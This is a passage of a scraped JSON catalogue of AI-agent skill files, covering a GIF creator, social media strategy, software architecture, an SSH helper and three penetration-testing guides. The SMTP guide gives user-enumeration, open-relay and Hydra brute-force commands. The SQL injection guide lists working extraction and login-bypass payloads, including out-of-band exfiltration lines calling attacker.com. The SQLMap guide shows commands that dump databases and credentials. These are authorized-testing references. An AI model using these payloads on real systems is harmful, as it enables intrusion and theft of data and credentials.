details)\n```\n\n**Complete validation**:\n```python\nfrom core.validators import validate_gif, is_slack_ready\n\n# Run all validations\nall_pass, results = validate_gif('emoji.gif', is_emoji=True)\n\n# Or quick check\nif is_slack_ready('emoji.gif', is_emoji=True):\n    print(\"Ready to upload!\")\n```\n\n## Animation Primitives\n\nThese are composable building blocks for motion. Apply these to any object in any combination:\n\n### Shake\n```python\nfrom templates.shake import create_shake_animation\n\n# Shake an emoji\nframes = create_shake_animation(\n    object_type='emoji',\n    object_data={'emoji': '😱', 'size': 80},\n    num_frames=20,\n    shake_intensity=15,\n    direction='both'  # or 'horizontal', 'vertical'\n)\n```\n\n### Bounce\n```python\nfrom templates.bounce import create_bounce_animation\n\n# Bounce a circle\nframes = create_bounce_animation(\n    object_type='circle',\n    object_data={'radius': 40, 'color': (255, 100, 100)},\n    num_frames=30,\n    bounce_height=150\n)\n```\n\n### Spin / Rotate\n```python\nfrom templates.spin import create_spin_animation, create_loading_spinner\n\n# Clockwise spin\nframes = create_spin_animation(\n    object_type='emoji',\n    object_data={'emoji': '🔄', 'size': 100},\n    rotation_type='clockwise',\n    full_rotations=2\n)\n\n# Wobble rotation\nframes = create_spin_animation(rotation_type='wobble', full_rotations=3)\n\n# Loading spinner\nframes = create_loading_spinner(spinner_type='dots')\n```\n\n### Pulse / Heartbeat\n```python\nfrom templates.pulse import create_pulse_animation, create_attention_pulse\n\n# Smooth pulse\nframes = create_pulse_animation(\n    object_data={'emoji': '❤️', 'size': 100},\n    pulse_type='smooth',\n    scale_range=(0.8, 1.2)\n)\n\n# Heartbeat (double-pump)\nframes = create_pulse_animation(pulse_type='heartbeat')\n\n# Attention pulse for emoji GIFs\nframes = create_attention_pulse(emoji='⚠️', num_frames=20)\n```\n\n### Fade\n```python\nfrom templates.fade import create_fade_animation, create_crossfade\n\n# Fade in\nframes = create_fade_animation(fade_type='in')\n\n# Fade out\nframes = create_fade_animation(fade_type='out')\n\n# Crossfade between two emojis\nframes = create_crossfade(\n    object1_data={'emoji': '😊', 'size': 100},\n    object2_data={'emoji': '😂', 'size': 100}\n)\n```\n\n### Zoom\n```python\nfrom templates.zoom import create_zoom_animation, create_explosion_zoom\n\n# Zoom in dramatically\nframes = create_zoom_animation(\n    zoom_type='in',\n    scale_range=(0.1, 2.0),\n    add_motion_blur=True\n)\n\n# Zoom out\nframes = create_zoom_animation(zoom_type='out')\n\n# Explosion zoom\nframes = create_explosion_zoom(emoji='💥')\n```\n\n### Explode / Shatter\n```python\nfrom templates.explode import create_explode_animation, create_particle_burst\n\n# Burst explosion\nframes = create_explode_animation(\n    explode_type='burst',\n    num_pieces=25\n)\n\n# Shatter effect\nframes = create_explode",
      "tags": [
        "python",
        "react",
        "ai",
        "template",
        "design",
        "slack",
        "image",
        "gif",
        "creator"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:16:04.740Z"
    },
    {
      "id": "antigravity-smtp-penetration-testing",
      "name": "SMTP Penetration Testing",
      "slug": "smtp-penetration-testing",
      "description": "This skill should be used when the user asks to \"perform SMTP penetration testing\", \"enumerate email users\", \"test for open mail relays\", \"grab SMTP banners\", \"brute force email credentials\", or \"assess mail server security\". It provides comprehensive techniques for testing SMTP server security.",
      "category": "Security & Systems",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/smtp-penetration-testing",
      "content": "\n# SMTP Penetration Testing\n\n## Purpose\n\nConduct comprehensive security assessments of SMTP (Simple Mail Transfer Protocol) servers to identify vulnerabilities including open relays, user enumeration, weak authentication, and misconfiguration. This skill covers banner grabbing, user enumeration techniques, relay testing, brute force attacks, and security hardening recommendations.\n\n## Prerequisites\n\n### Required Tools\n```bash\n# Nmap with SMTP scripts\nsudo apt-get install nmap\n\n# Netcat\nsudo apt-get install netcat\n\n# Hydra for brute force\nsudo apt-get install hydra\n\n# SMTP user enumeration tool\nsudo apt-get install smtp-user-enum\n\n# Metasploit Framework\nmsfconsole\n```\n\n### Required Knowledge\n- SMTP protocol fundamentals\n- Email architecture (MTA, MDA, MUA)\n- DNS and MX records\n- Network protocols\n\n### Required Access\n- Target SMTP server IP/hostname\n- Written authorization for testing\n- Wordlists for enumeration and brute force\n\n## Outputs and Deliverables\n\n1. **SMTP Security Assessment Report** - Comprehensive vulnerability findings\n2. **User Enumeration Results** - Valid email addresses discovered\n3. **Relay Test Results** - Open relay status and exploitation potential\n4. **Remediation Recommendations** - Security hardening guidance\n\n## Core Workflow\n\n### Phase 1: SMTP Architecture Understanding\n\n```\nComponents: MTA (transfer) → MDA (delivery) → MUA (client)\n\nPorts: 25 (SMTP), 465 (SMTPS), 587 (submission), 2525 (alternative)\n\nWorkflow: Sender MUA → Sender MTA → DNS/MX → Recipient MTA → MDA → Recipient MUA\n```\n\n### Phase 2: SMTP Service Discovery\n\nIdentify SMTP servers and versions:\n\n```bash\n# Discover SMTP ports\nnmap -p 25,465,587,2525 -sV TARGET_IP\n\n# Aggressive service detection\nnmap -sV -sC -p 25 TARGET_IP\n\n# SMTP-specific scripts\nnmap --script=smtp-* -p 25 TARGET_IP\n\n# Discover MX records for domain\ndig MX target.com\nnslookup -type=mx target.com\nhost -t mx target.com\n```\n\n### Phase 3: Banner Grabbing\n\nRetrieve SMTP server information:\n\n```bash\n# Using Telnet\ntelnet TARGET_IP 25\n# Response: 220 mail.target.com ESMTP Postfix\n\n# Using Netcat\nnc TARGET_IP 25\n# Response: 220 mail.target.com ESMTP\n\n# Using Nmap\nnmap -sV -p 25 TARGET_IP\n# Version detection extracts banner info\n\n# Manual SMTP commands\nEHLO test\n# Response reveals supported extensions\n```\n\nParse banner information:\n\n```\nBanner reveals:\n- Server software (Postfix, Sendmail, Exchange)\n- Version information\n- Hostname\n- Supported SMTP extensions (STARTTLS, AUTH, etc.)\n```\n\n### Phase 4: SMTP Command Enumeration\n\nTest available SMTP commands:\n\n```bash\n# Connect and test commands\nnc TARGET_IP 25\n\n# Initial greeting\nEHLO attacker.com\n\n# Response shows capabilities:\n250-mail.target.com\n250-PIPELINING\n250-SIZE 10240000\n250-VRFY\n250-ETRN\n250-STARTTLS\n250-AUTH PLAIN LOGIN\n250-8BITMIME\n250 DSN\n```\n\nKey commands to test:\n\n```bash\n# VRFY - Verify user exists\nVRFY admin\n250 2.1.5 admin@target.com\n\n# EXPN - Expand mailing list\nEXPN staff\n250 2.1.5 user1@target.com\n250 2.1.5 user2@target.com\n\n# RCPT TO - Recipient verification\nMAIL FROM:<test@attacker.com>\nRCPT TO:<admin@target.com>\n# 250 OK = user exists\n# 550 = user doesn't exist\n```\n\n### Phase 5: User Enumeration\n\nEnumerate valid email addresses:\n\n```bash\n# Using smtp-user-enum with VRFY\nsmtp-user-enum -M VRFY -U /usr/share/wordlists/users.txt -t TARGET_IP\n\n# Using EXPN method\nsmtp-user-enum -M EXPN -U /usr/share/wordlists/users.txt -t TARGET_IP\n\n# Using RCPT method\nsmtp-user-enum -M RCPT -U /usr/share/wordlists/users.txt -t TARGET_IP\n\n# Specify port and domain\nsmtp-user-enum -M VRFY -U users.txt -t TARGET_IP -p 25 -d target.com\n```\n\nUsing Metasploit:\n\n```bash\nuse auxiliary/scanner/smtp/smtp_enum\nset RHOSTS TARGET_IP\nset USER_FILE /usr/share/wordlists/metasploit/unix_users.txt\nset UNIXONLY true\nrun\n```\n\nUsing Nmap:\n\n```bash\n# SMTP user enumeration script\nnmap --script smtp-enum-users -p 25 TARGET_IP\n\n# With custom user list\nnmap --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} -p 25 TARGET_IP\n```\n\n### Phase 6: Open Relay Testing\n\nTest for unauthorized email relay:\n\n```bash\n# Using Nmap\nnmap -p 25 --script smtp-open-relay TARGET_IP\n\n# Manual testing via Telnet\ntelnet TARGET_IP 25\nHELO attacker.com\nMAIL FROM:<test@attacker.com>\nRCPT TO:<victim@external-domain.com>\nDATA\nSubject: Relay Test\nThis is a test.\n.\nQUIT\n\n# If accepted (250 OK), server is open relay\n```\n\nUsing Metasploit:\n\n```bash\nuse auxiliary/scanner/smtp/smtp_relay\nset RHOSTS TARGET_IP\nrun\n```\n\nTest variations:\n\n```bash\n# Test different sender/recipient combinations\nMAIL FROM:<>\nMAIL FROM:<test@[attacker_IP]>\nMAIL FROM:<test@target.com>\n\nRCPT TO:<test@external.com>\nRCPT TO:<\"test@external.com\">\nRCPT TO:<test%external.com@target.com>\n```\n\n### Phase 7: Brute Force Authentication\n\nTest for weak SMTP credentials:\n\n```bash\n# Using Hydra\nhydra -l admin -P /usr/share/wordlists/rockyou.txt smtp://TARGET_IP\n\n# With specific port and SSL\nhydra -l admin -P passwords.txt -s 465 -S TARGET_IP smtp\n\n# Multiple users\nhydra -L users.tx",
      "tags": [
        "ai",
        "workflow",
        "document",
        "security",
        "vulnerability"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:21:52.307Z"
    },
    {
      "id": "antigravity-social-content",
      "name": "social-content",
      "slug": "social-content",
      "description": "When the user wants help creating, scheduling, or optimizing social media content for LinkedIn, Twitter/X, Instagram, TikTok, Facebook, or other platforms. Also use when the user mentions 'LinkedIn post,' 'Twitter thread,' 'social media,' 'content calendar,' 'social scheduling,' 'engagement,' or 'vi",
      "category": "Security & Systems",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/social-content",
      "content": "\n# Social Content\n\nYou are an expert social media strategist with direct access to a scheduling platform that publishes to all major social networks. Your goal is to help create engaging content that builds audience, drives engagement, and supports business goals.\n\n## Before Creating Content\n\nGather this context (ask if not provided):\n\n### 1. Goals\n- What's the primary objective? (Brand awareness, leads, traffic, community)\n- What action do you want people to take?\n- Are you building personal brand, company brand, or both?\n\n### 2. Audience\n- Who are you trying to reach?\n- What platforms are they most active on?\n- What content do they engage with?\n- What problems do they have that you can address?\n\n### 3. Brand Voice\n- What's your tone? (Professional, casual, witty, authoritative)\n- Any topics to avoid?\n- Any specific terminology or style guidelines?\n\n### 4. Resources\n- How much time can you dedicate to social?\n- Do you have existing content to repurpose (blog posts, podcasts, videos)?\n- Can you create video content?\n- Do you have customer stories or data to share?\n\n---\n\n## Platform Strategy Guide\n\n### LinkedIn\n\n**Best for:** B2B, thought leadership, professional networking, recruiting\n**Audience:** Professionals, decision-makers, job seekers\n**Posting frequency:** 3-5x per week\n**Best times:** Tuesday-Thursday, 7-8am, 12pm, 5-6pm\n\n**What works:**\n- Personal stories with business lessons\n- Contrarian takes on industry topics\n- Behind-the-scenes of building a company\n- Data and original insights\n- Carousel posts (document format)\n- Polls that spark discussion\n\n**What doesn't:**\n- Overly promotional content\n- Generic motivational quotes\n- Links in the main post (kills reach)\n- Corporate speak without personality\n\n**Format tips:**\n- First line is everything (hook before \"see more\")\n- Use line breaks for readability\n- 1,200-1,500 characters performs well\n- Put links in comments, not post body\n- Tag people sparingly and genuinely\n\n### Twitter/X\n\n**Best for:** Tech, media, real-time commentary, community building\n**Audience:** Tech-savvy, news-oriented, niche communities\n**Posting frequency:** 3-10x per day (including replies)\n**Best times:** Varies by audience; test and measure\n\n**What works:**\n- Hot takes and opinions\n- Threads that teach something\n- Behind-the-scenes moments\n- Engaging with others' content\n- Memes and humor (if on-brand)\n- Real-time commentary on events\n\n**What doesn't:**\n- Pure self-promotion\n- Threads without a strong hook\n- Ignoring replies and mentions\n- Scheduling everything (no real-time presence)\n\n**Format tips:**\n- Tweets under 100 characters get more engagement\n- Threads: Hook in tweet 1, promise value, deliver\n- Quote tweets with added insight beat plain retweets\n- Use visuals to stop the scroll\n\n### Instagram\n\n**Best for:** Visual brands, lifestyle, e-commerce, younger demographics\n**Audience:** 18-44, visual-first consumers\n**Posting frequency:** 1-2 feed posts per day, 3-10 Stories per day\n**Best times:** 11am-1pm, 7-9pm\n\n**What works:**\n- High-quality visuals\n- Behind-the-scenes Stories\n- Reels (short-form video)\n- Carousels with value\n- User-generated content\n- Interactive Stories (polls, questions)\n\n**What doesn't:**\n- Low-quality images\n- Too much text in images\n- Ignoring Stories and Reels\n- Only promotional content\n\n**Format tips:**\n- Reels get 2x reach of static posts\n- First frame of Reels must hook\n- Carousels: 10 slides with educational content\n- Use all Story features (polls, links, etc.)\n\n### TikTok\n\n**Best for:** Brand awareness, younger audiences, viral potential\n**Audience:** 16-34, entertainment-focused\n**Posting frequency:** 1-4x per day\n**Best times:** 7-9am, 12-3pm, 7-11pm\n\n**What works:**\n- Native, unpolished content\n- Trending sounds and formats\n- Educational content in entertaining wrapper\n- POV and day-in-the-life content\n- Responding to comments with videos\n- Duets and stitches\n\n**What doesn't:**\n- Overly produced content\n- Ignoring trends\n- Hard selling\n- Repurposed horizontal video\n\n**Format tips:**\n- Hook in first 1-2 seconds\n- Keep it under 30 seconds to start\n- Vertical only (9:16)\n- Use trending sounds\n- Post consistently to train algorithm\n\n### Facebook\n\n**Best for:** Communities, local businesses, older demographics, groups\n**Audience:** 25-55+, community-oriented\n**Posting frequency:** 1-2x per day\n**Best times:** 1-4pm weekdays\n\n**What works:**\n- Facebook Groups (community)\n- Native video\n- Live video\n- Local content and events\n- Discussion-prompting questions\n\n**What doesn't:**\n- Links to external sites (reach killer)\n- Pure promotional content\n- Ignoring comments\n- Cross-posting from other platforms without adaptation\n\n---\n\n## Content Pillars Framework\n\nBuild your content around 3-5 pillars that align with your expertise and audience interests.\n\n### Example for a SaaS Founder\n\n| Pillar | % of Content | Topics |\n|--------|--------------|--------|\n| Industry insights | 30% | Trends, data, predictions |\n| Behind-the-scenes | 25% | Building the compa",
      "tags": [
        "react",
        "api",
        "ai",
        "automation",
        "workflow",
        "template",
        "document",
        "spreadsheet",
        "image",
        "vulnerability"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:21:53.406Z"
    },
    {
      "id": "antigravity-software-architecture",
      "name": "software-architecture",
      "slug": "software-architecture",
      "description": "Guide for quality focused software architecture. This skill should be used when users want to write code, design architecture, analyze code, in any case that relates to software development.",
      "category": "Development & Code Tools",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/software-architecture",
      "content": "\n# Software Architecture Development Skill\n\nThis skill provides guidance for quality focused software development and architecture. It is based on Clean Architecture and Domain Driven Design principles.\n\n## Code Style Rules\n\n### General Principles\n\n- **Early return pattern**: Always use early returns when possible, over nested conditions for better readability\n- Avoid code duplication through creation of reusable functions and modules\n- Decompose long (more than 80 lines of code) components and functions into multiple smaller components and functions. If they cannot be used anywhere else, keep it in the same file. But if file longer than 200 lines of code, it should be split into multiple files.\n- Use arrow functions instead of function declarations when possible\n\n### Best Practices\n\n#### Library-First Approach\n\n- **ALWAYS search for existing solutions before writing custom code**\n  - Check npm for existing libraries that solve the problem\n  - Evaluate existing services/SaaS solutions\n  - Consider third-party APIs for common functionality\n- Use libraries instead of writing your own utils or helpers. For example, use `cockatiel` instead of writing your own retry logic.\n- **When custom code IS justified:**\n  - Specific business logic unique to the domain\n  - Performance-critical paths with special requirements\n  - When external dependencies would be overkill\n  - Security-sensitive code requiring full control\n  - When existing solutions don't meet requirements after thorough evaluation\n\n#### Architecture and Design\n\n- **Clean Architecture & DDD Principles:**\n  - Follow domain-driven design and ubiquitous language\n  - Separate domain entities from infrastructure concerns\n  - Keep business logic independent of frameworks\n  - Define use cases clearly and keep them isolated\n- **Naming Conventions:**\n  - **AVOID** generic names: `utils`, `helpers`, `common`, `shared`\n  - **USE** domain-specific names: `OrderCalculator`, `UserAuthenticator`, `InvoiceGenerator`\n  - Follow bounded context naming patterns\n  - Each module should have a single, clear purpose\n- **Separation of Concerns:**\n  - Do NOT mix business logic with UI components\n  - Keep database queries out of controllers\n  - Maintain clear boundaries between contexts\n  - Ensure proper separation of responsibilities\n\n#### Anti-Patterns to Avoid\n\n- **NIH (Not Invented Here) Syndrome:**\n  - Don't build custom auth when Auth0/Supabase exists\n  - Don't write custom state management instead of using Redux/Zustand\n  - Don't create custom form validation instead of using established libraries\n- **Poor Architectural Choices:**\n  - Mixing business logic with UI components\n  - Database queries directly in controllers\n  - Lack of clear separation of concerns\n- **Generic Naming Anti-Patterns:**\n  - `utils.js` with 50 unrelated functions\n  - `helpers/misc.js` as a dumping ground\n  - `common/shared.js` with unclear purpose\n- Remember: Every line of custom code is a liability that needs maintenance, testing, and documentation\n\n#### Code Quality\n\n- Proper error handling with typed catch blocks\n- Break down complex logic into smaller, reusable functions\n- Avoid deep nesting (max 3 levels)\n- Keep functions focused and under 50 lines when possible\n- Keep files focused and under 200 lines of code when possible\n",
      "tags": [
        "api",
        "ai",
        "design",
        "document",
        "security",
        "supabase"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:21:54.674Z"
    },
    {
      "id": "antigravity-sql-injection-testing",
      "name": "SQL Injection Testing",
      "slug": "sql-injection-testing",
      "description": "This skill should be used when the user asks to \"test for SQL injection vulnerabilities\", \"perform SQLi attacks\", \"bypass authentication using SQL injection\", \"extract database information through injection\", \"detect SQL injection flaws\", or \"exploit database query vulnerabilities\". It provides comp",
      "category": "Security & Systems",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/sql-injection-testing",
      "content": "\n# SQL Injection Testing\n\n## Purpose\n\nExecute comprehensive SQL injection vulnerability assessments on web applications to identify database security flaws, demonstrate exploitation techniques, and validate input sanitization mechanisms. This skill enables systematic detection and exploitation of SQL injection vulnerabilities across in-band, blind, and out-of-band attack vectors to assess application security posture.\n\n## Inputs / Prerequisites\n\n### Required Access\n- Target web application URL with injectable parameters\n- Burp Suite or equivalent proxy tool for request manipulation\n- SQLMap installation for automated exploitation\n- Browser with developer tools enabled\n\n### Technical Requirements\n- Understanding of SQL query syntax (MySQL, MSSQL, PostgreSQL, Oracle)\n- Knowledge of HTTP request/response cycle\n- Familiarity with database schemas and structures\n- Write permissions for testing reports\n\n### Legal Prerequisites\n- Written authorization for penetration testing\n- Defined scope including target URLs and parameters\n- Emergency contact procedures established\n- Data handling agreements in place\n\n## Outputs / Deliverables\n\n### Primary Outputs\n- SQL injection vulnerability report with severity ratings\n- Extracted database schemas and table structures\n- Authentication bypass proof-of-concept demonstrations\n- Remediation recommendations with code examples\n\n### Evidence Artifacts\n- Screenshots of successful injections\n- HTTP request/response logs\n- Database dumps (sanitized)\n- Payload documentation\n\n## Core Workflow\n\n### Phase 1: Detection and Reconnaissance\n\n#### Identify Injectable Parameters\nLocate user-controlled input fields that interact with database queries:\n\n```\n# Common injection points\n- URL parameters: ?id=1, ?user=admin, ?category=books\n- Form fields: username, password, search, comments\n- Cookie values: session_id, user_preference\n- HTTP headers: User-Agent, Referer, X-Forwarded-For\n```\n\n#### Test for Basic Vulnerability Indicators\nInsert special characters to trigger error responses:\n\n```sql\n-- Single quote test\n'\n\n-- Double quote test\n\"\n\n-- Comment sequences\n--\n#\n/**/\n\n-- Semicolon for query stacking\n;\n\n-- Parentheses\n)\n```\n\nMonitor application responses for:\n- Database error messages revealing query structure\n- Unexpected application behavior changes\n- HTTP 500 Internal Server errors\n- Modified response content or length\n\n#### Logic Testing Payloads\nVerify boolean-based vulnerability presence:\n\n```sql\n-- True condition tests\npage.asp?id=1 or 1=1\npage.asp?id=1' or 1=1--\npage.asp?id=1\" or 1=1--\n\n-- False condition tests  \npage.asp?id=1 and 1=2\npage.asp?id=1' and 1=2--\n```\n\nCompare responses between true and false conditions to confirm injection capability.\n\n### Phase 2: Exploitation Techniques\n\n#### UNION-Based Extraction\nCombine attacker-controlled SELECT statements with original query:\n\n```sql\n-- Determine column count\nORDER BY 1--\nORDER BY 2--\nORDER BY 3--\n-- Continue until error occurs\n\n-- Find displayable columns\nUNION SELECT NULL,NULL,NULL--\nUNION SELECT 'a',NULL,NULL--\nUNION SELECT NULL,'a',NULL--\n\n-- Extract data\nUNION SELECT username,password,NULL FROM users--\nUNION SELECT table_name,NULL,NULL FROM information_schema.tables--\nUNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--\n```\n\n#### Error-Based Extraction\nForce database errors that leak information:\n\n```sql\n-- MSSQL version extraction\n1' AND 1=CONVERT(int,(SELECT @@version))--\n\n-- MySQL extraction via XPATH\n1' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--\n\n-- PostgreSQL cast errors\n1' AND 1=CAST((SELECT version()) AS int)--\n```\n\n#### Blind Boolean-Based Extraction\nInfer data through application behavior changes:\n\n```sql\n-- Character extraction\n1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--\n1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='b'--\n\n-- Conditional responses\n1' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0--\n```\n\n#### Time-Based Blind Extraction\nUse database sleep functions for confirmation:\n\n```sql\n-- MySQL\n1' AND IF(1=1,SLEEP(5),0)--\n1' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a',SLEEP(5),0)--\n\n-- MSSQL\n1'; WAITFOR DELAY '0:0:5'--\n\n-- PostgreSQL\n1'; SELECT pg_sleep(5)--\n```\n\n#### Out-of-Band (OOB) Extraction\nExfiltrate data through external channels:\n\n```sql\n-- MSSQL DNS exfiltration\n1; EXEC master..xp_dirtree '\\\\attacker-server.com\\share'--\n\n-- MySQL DNS exfiltration\n1' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.attacker.com\\\\a'))--\n\n-- Oracle HTTP request\n1' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual--\n```\n\n### Phase 3: Authentication Bypass\n\n#### Login Form Exploitation\nCraft payloads to bypass credential verification:\n\n```sql\n-- Classic bypass\nadmin'--\nadmin'/*\n' OR '1'='1\n' OR '1'='1'--\n' OR '1'='1'/*\n') OR ('1'='1\n') OR ('1'='1'--\n\n-- Username enumeration\nadmin' AND '1'='1\nadmin' AND '1'='2\n```\n\nQuery transformation example:\n```sql\n-- Origi",
      "tags": [
        "ai",
        "agent",
        "workflow",
        "document",
        "security",
        "vulnerability",
        "aws",
        "rag",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:21:55.857Z"
    },
    {
      "id": "antigravity-sqlmap-database-pentesting",
      "name": "SQLMap Database Penetration Testing",
      "slug": "sqlmap-database-pentesting",
      "description": "This skill should be used when the user asks to \"automate SQL injection testing,\" \"enumerate database structure,\" \"extract database credentials using sqlmap,\" \"dump tables and columns from a vulnerable database,\" or \"perform automated database penetration testing.\" It provides comprehensive guidance",
      "category": "Security & Systems",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/sqlmap-database-pentesting",
      "content": "\n# SQLMap Database Penetration Testing\n\n## Purpose\n\nProvide systematic methodologies for automated SQL injection detection and exploitation using SQLMap. This skill covers database enumeration, table and column discovery, data extraction, multiple target specification methods, and advanced exploitation techniques for MySQL, PostgreSQL, MSSQL, Oracle, and other database management systems.\n\n## Inputs / Prerequisites\n\n- **Target URL**: Web application URL with injectable parameter (e.g., `?id=1`)\n- **SQLMap Installation**: Pre-installed on Kali Linux or downloaded from GitHub\n- **Verified Injection Point**: URL parameter confirmed or suspected to be SQL injectable\n- **Request File (Optional)**: Burp Suite captured HTTP request for POST-based injection\n- **Authorization**: Written permission for penetration testing activities\n\n## Outputs / Deliverables\n\n- **Database Enumeration**: List of all databases on the target server\n- **Table Structure**: Complete table names within target database\n- **Column Mapping**: Column names and data types for each table\n- **Extracted Data**: Dumped records including usernames, passwords, and sensitive data\n- **Hash Values**: Password hashes for offline cracking\n- **Vulnerability Report**: Confirmation of SQL injection type and severity\n\n## Core Workflow\n\n### 1. Identify SQL Injection Vulnerability\n\n#### Manual Verification\n```bash\n# Add single quote to break query\nhttp://target.com/page.php?id=1'\n\n# If error message appears, likely SQL injectable\n# Error example: \"You have an error in your SQL syntax\"\n```\n\n#### Initial SQLMap Scan\n```bash\n# Basic vulnerability detection\nsqlmap -u \"http://target.com/page.php?id=1\" --batch\n\n# With verbosity for detailed output\nsqlmap -u \"http://target.com/page.php?id=1\" --batch -v 3\n```\n\n### 2. Enumerate Databases\n\n#### List All Databases\n```bash\nsqlmap -u \"http://target.com/page.php?id=1\" --dbs --batch\n```\n\n**Key Options:**\n- `-u`: Target URL with injectable parameter\n- `--dbs`: Enumerate database names\n- `--batch`: Use default answers (non-interactive mode)\n\n### 3. Enumerate Tables\n\n#### List Tables in Specific Database\n```bash\nsqlmap -u \"http://target.com/page.php?id=1\" -D database_name --tables --batch\n```\n\n**Key Options:**\n- `-D`: Specify target database name\n- `--tables`: Enumerate table names\n\n### 4. Enumerate Columns\n\n#### List Columns in Specific Table\n```bash\nsqlmap -u \"http://target.com/page.php?id=1\" -D database_name -T table_name --columns --batch\n```\n\n**Key Options:**\n- `-T`: Specify target table name\n- `--columns`: Enumerate column names\n\n### 5. Extract Data\n\n#### Dump Specific Table Data\n```bash\nsqlmap -u \"http://target.com/page.php?id=1\" -D database_name -T table_name --dump --batch\n```\n\n#### Dump Specific Columns\n```bash\nsqlmap -u \"http://target.com/page.php?id=1\" -D database_name -T users -C username,password --dump --batch\n```\n\n#### Dump Entire Database\n```bash\nsqlmap -u \"http://target.com/page.php?id=1\" -D database_name --dump-all --batch\n```\n\n**Key Options:**\n- `--dump`: Extract all data from specified table\n- `--dump-all`: Extract all data from all tables\n- `-C`: Specify column names to extract\n\n### 6. Advanced Target Options\n\n#### Target from HTTP Request File\n```bash\n# Save Burp Suite request to file, then:\nsqlmap -r /path/to/request.txt --dbs --batch\n```\n\n#### Target from Log File\n```bash\n# Feed log file with multiple requests\nsqlmap -l /path/to/logfile --dbs --batch\n```\n\n#### Target Multiple URLs (Bulk File)\n```bash\n# Create file with URLs, one per line:\n# http://target1.com/page.php?id=1\n# http://target2.com/page.php?id=2\nsqlmap -m /path/to/bulkfile.txt --dbs --batch\n```\n\n#### Target via Google Dorks (Use with Caution)\n```bash\n# Automatically find and test vulnerable sites (LEGAL TARGETS ONLY)\nsqlmap -g \"inurl:?id= site:yourdomain.com\" --batch\n```\n\n## Quick Reference Commands\n\n### Database Enumeration Progression\n\n| Stage | Command |\n|-------|---------|\n| List Databases | `sqlmap -u \"URL\" --dbs --batch` |\n| List Tables | `sqlmap -u \"URL\" -D dbname --tables --batch` |\n| List Columns | `sqlmap -u \"URL\" -D dbname -T tablename --columns --batch` |\n| Dump Data | `sqlmap -u \"URL\" -D dbname -T tablename --dump --batch` |\n| Dump All | `sqlmap -u \"URL\" -D dbname --dump-all --batch` |\n\n### Supported Database Management Systems\n\n| DBMS | Support Level |\n|------|---------------|\n| MySQL | Full Support |\n| PostgreSQL | Full Support |\n| Microsoft SQL Server | Full Support |\n| Oracle | Full Support |\n| Microsoft Access | Full Support |\n| IBM DB2 | Full Support |\n| SQLite | Full Support |\n| Firebird | Full Support |\n| Sybase | Full Support |\n| SAP MaxDB | Full Support |\n| HSQLDB | Full Support |\n| Informix | Full Support |\n\n### SQL Injection Techniques\n\n| Technique | Description | Flag |\n|-----------|-------------|------|\n| Boolean-based blind | Infers data from true/false responses | `--technique=B` |\n| Time-based blind | Uses time delays to infer data | `--technique=T` |\n| Error-based | Extracts data from error messages | `--techniq",
      "tags": [
        "ai",
        "agent",
        "workflow",
        "document",
        "vulnerability",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:21:57.196Z"
    },
    {
      "id": "openhands-ssh",
      "name": "SSH Microagent",
      "slug": "ssh",
      "description": "This microagent provides capabilities for establishing and managing SSH connections to remote machines.",
      "category": "Development & Code Tools",
      "source": "openhands",
      "repoUrl": "https://github.com/OpenHands/OpenHands",
      "skillUrl": "https://github.com/OpenHands/OpenHands/blob/main/skills/ssh.md",
      "content": "\n# SSH Microagent\n\nThis microagent provides capabilities for establishing and managing SSH connections to remote machines.\n\n## Capabilities\n\n- Establish SSH connections using password or key-based authentication\n- Generate and manage SSH key pairs\n- Configure SSH for easier connections\n- Execute commands on remote machines\n- Transfer files between local and remote machines\n- Manage SSH configurations and known hosts\n\n## Authentication Methods\n\n### Password Authentication\n\n```bash\nssh username@hostname\n```\n\nWhen prompted, you should ask the user for their password or a private key.\n\n### Key-Based Authentication\n\nGenerate a new SSH key pair:\n```bash\nssh-keygen -t ed25519 -f ~/.ssh/key_name -C \"comment\" -N \"\"\n```\n\nCopy the public key to the remote server:\n```bash\nssh-copy-id -i ~/.ssh/key_name.pub username@hostname\n```\n\nConnect using the private key:\n```bash\nssh -i ~/.ssh/key_name username@hostname\n```\n\n## SSH Configuration\n\nCreate or edit the SSH config file for easier connections:\n```bash\nmkdir -p ~/.ssh\ncat > ~/.ssh/config << 'EOF'\nHost alias\n    HostName hostname_or_ip\n    User username\n    IdentityFile ~/.ssh/key_name\n    Port 22\n    ServerAliveInterval 60\nEOF\nchmod 600 ~/.ssh/config\n```\n\nThen connect using the alias:\n```bash\nssh alias\n```\n\n## Common SSH Options\n\n- `-p PORT`: Connect to a specific port\n- `-X`: Enable X11 forwarding\n- `-L local_port:remote_host:remote_port`: Set up local port forwarding\n- `-R remote_port:local_host:local_port`: Set up remote port forwarding\n- `-N`: Do not execute a remote command (useful for port forwarding)\n- `-f`: Run in background\n- `-v`: Verbose mode (add more v's for increased verbosity)\n\n## File Transfer with SCP\n\nCopy a file to the remote server:\n```bash\nscp 